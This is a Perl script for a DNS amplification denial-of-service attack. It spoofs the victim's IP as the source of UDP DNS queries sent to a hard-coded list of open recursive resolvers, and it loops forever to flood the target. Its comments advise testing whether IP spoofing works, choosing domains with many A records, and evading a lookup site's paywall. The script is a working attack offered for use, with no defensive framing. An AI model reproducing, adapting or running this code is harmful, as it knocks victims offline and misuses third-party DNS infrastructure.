#!/usr/bin/perl
# Get Net::RawIP at http://search.cpan.org/CPAN/authors/id/S/SZ/SZABGAB/Net-RawIP-0.21_01.tar.gz
# cpan Net::DNS:Resolver seems to work fine on each machine I throw it on, as well.
# PS: To see if you can spoof, check out the ANA Spoofer project.
# http://spoofer.csail.mit.edu/
#
# Written by Shadow
# irc.dark-irc.net #thecorpz
# chemshadow@gmail.com

use Net::DNS::Resolver;
use Net::RawIP;
use strict;

# Populate this list with domain names with lots of A records. IRC server DNS pools are a good place to look.
# Maybe get a cheap throwaway domain and add your own A records.
my @name = ("irc.efnet.net", "irc.dal.net", "irc.undernet.org", "irc.freenode.net");
my $names = "3"; #number of entries in @name, minus one.

# Populate this list with ONLY open, recursive dns servers.
# http://www.dnsstuff.com/ - Block their cookies to use the site w/o paying.
my $nameservers;
my @nameservers = ("205.234.223.168", "64.202.117.121", "208.80.184.69", "200.255.59.150") #4 entries.

my $reflectors = "3"; # Number of entries in @nameservers, minus one.
my $debug = 1; # Change to 0 if you don't wanna have your console flooded.

##########################
# END USER CONFIGURATION #
##########################

my $str;
my $name;
my $src_ip;
my $reflector;
$src_ip = $ARGV[0];

if ($ARGV[0] eq '') { print "Usage: " . $0 . " <IP>\n"; exit(0); }
print ("Hitting $ARGV[0]\n");

for (my $i=0; $i < 256; $i++) {
    # Make DNS packet
    my $dnspacket = new Net::DNS::Packet($str, "A", "IN");
    my $dnsdata = $dnspacket->data;
    my $sock = new Net::RawIP({udp=>{}});
    # send packet
    $str = @name[int rand($names)];                            # Select entry from @name
    $reflector = $nameservers[int rand($reflectors)];          # Select entry from @nameservers
    $sock->set({ip => {
                saddr => $src_ip, daddr => "$reflector", frag_off=>0,tos=>0,id=>1565},
                udp => {source => 53,
                dest => 53, data=>$dnsdata
                } });
    $sock->send;
    if ($debug eq "1") { print "Me -> " . $reflector . "(DNSing " . $str . ")" . " -> " . $src_ip . " \n"; }
    $i = 0;
}
exit(0);